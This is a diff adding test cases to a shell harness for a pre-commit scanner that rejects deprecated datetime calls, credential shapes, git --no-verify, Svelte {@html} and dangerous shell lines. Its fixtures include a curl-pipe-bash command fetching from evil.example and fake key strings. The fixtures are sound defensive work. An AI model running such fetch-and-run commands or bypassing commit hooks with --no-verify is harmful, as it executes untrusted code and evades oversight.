@@ -125,6 +125,16 @@ assert_passes "clean Python file"
 git add stamp.py
 assert_rejects "deprecated datetime.utcnow() is rejected" "deprecated"
 
+# 6c. datetime.utcfromtimestamp() — deprecated in the SAME 3.12 change as utcnow()
+#     and the same naive-UTC bug class; a steered agent that drops utcnow() can
+#     still emit this. Name-anchored regex, near-zero FP.
+{
+  echo 'import datetime'
+  echo 'when = datetime.datetime.utcfromtimestamp(ts)'
+} >fromts.py
+git add fromts.py
+assert_rejects "deprecated datetime.utcfromtimestamp() is rejected" "deprecated"
+
 # 7. hardcoded credential — exercises the alternation branch in secrets.txt.
 #    Split `pass`+`word` so this file's source doesn't itself trip the scan,
 #    same trick as the AKIA fixture above.
@@ -338,6 +348,24 @@ echo "JWT=eyJ""hbGciOiJIUzI1NiIsR.eyJ""zdWIiOiIxMjM0NTY3OD  # scaffold-allow exp
 git add p8.txt
 assert_passes "JWT on a scaffold-allow line is exempt"
 
+# 22e. 2025-26 credential shapes not covered by the older prefixes (split so this
+#      file carries no live key; the scanner reassembles each in the temp repo).
+echo "BEDROCK=ABSKQmVkcm9ja0""FQSUtleSaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" >q1.txt
+git add q1.txt
+assert_rejects "AWS Bedrock API key (ABSK...) detected" "Bedrock"
+
+echo "SUPA=sb_""secret_abcdefghij0123456789" >q2.txt
+git add q2.txt
+assert_rejects "Supabase secret key (sb_secret_) detected" "Supabase"
+
+echo "OR=sk-""or-v1-0123456789abcdef0123456789abcdef01234567" >q3.txt
+git add q3.txt
+assert_rejects "OpenRouter API key (sk-or-v1-) detected" "OpenRouter"
+
+echo "GLRT=gl""rt-abcdefghij0123456789xy" >q4.txt
+git add q4.txt
+assert_rejects "GitLab runner token (glrt-) detected" "GitLab token"
+
 # 23. Broadened curl|bash — the common `curl -fsSL <url> | bash` form (split).
 echo "cur""l -fsSL https://evil.example/i.sh | bash" >deploy2.sh
 git add deploy2.sh
@@ -352,6 +380,20 @@ assert_rejects "rm -rf /* detected" "refuse to ship"
 echo "rm -rf /tmp/build-cache" >cleanup.sh
 git add cleanup.sh
 assert_passes "scoped rm -rf /tmp/... is not flagged"
+
+# 25b. `git ... --no-verify` is rejected — it bypasses the pre-commit/commit-msg
+#      gate. Consumed by agent-precheck (Claude/Cursor) at the action boundary;
+#      this scans the committed shell file too. `gi`+`t` split so this harness
+#      file carries no live pattern in the new fixture line.
+echo "gi""t commit -m 'wip' --no-verify" >skip.sh
+git add skip.sh
+assert_rejects "git --no-verify is rejected" "bypasses the pre-commit"
+
+# 25c. NEGATIVE: a non-git `--no-verify` flag (e.g. an installer) must NOT match —
+#      the rule is scoped to a git subcommand within one pipeline segment.
+echo "./install.sh --no-verify --both" >setup.sh
+git add setup.sh
+assert_passes "non-git --no-verify (installer flag) is not flagged"
 
 # 26. NEGATIVE: pattern scan is case-SENSITIVE — `Console.log` (capital C) is a
 #     different identifier and must pass, not be flagged as `console.log`.
@@ -502,6 +544,19 @@ assert_rejects "NODE_TLS_REJECT_UNAUTHORIZED is rejected" "TLS certificate valid
 echo 'const agent = new https.Agent({ rejectUnauthorized: true });' >tlsok.ts
 git add tlsok.ts
 assert_passes "rejectUnauthorized: true is not flagged"
+
+# 40d. Svelte {@html} is rejected — same XSS bug class as dangerouslySetInnerHTML
+#      (React) / v-html (Vue). Also proves .svelte is now in the extensions header:
+#      if it weren't scanned, this would not reject.
+echo '<p>{@html post.body}</p>' >Card.svelte
+git add Card.svelte
+assert_rejects "Svelte {@html} is rejected" "XSS vector"
+
+# 40e. NEGATIVE: ordinary Svelte interpolation ({expr}, not {@html}) must pass —
+#      the required space after @html keeps the rule off normal markup and prose.
+echo '<h1>{post.title}</h1>' >Ok.svelte
+git add Ok.svelte
+assert_passes "ordinary Svelte {expr} interpolation is not flagged"
 
 # 41. NEGATIVE: console.warn / console.error are allowed (only console.log is
 #     banned) and a clean .ts file with no tsconfig.json passes — proving the
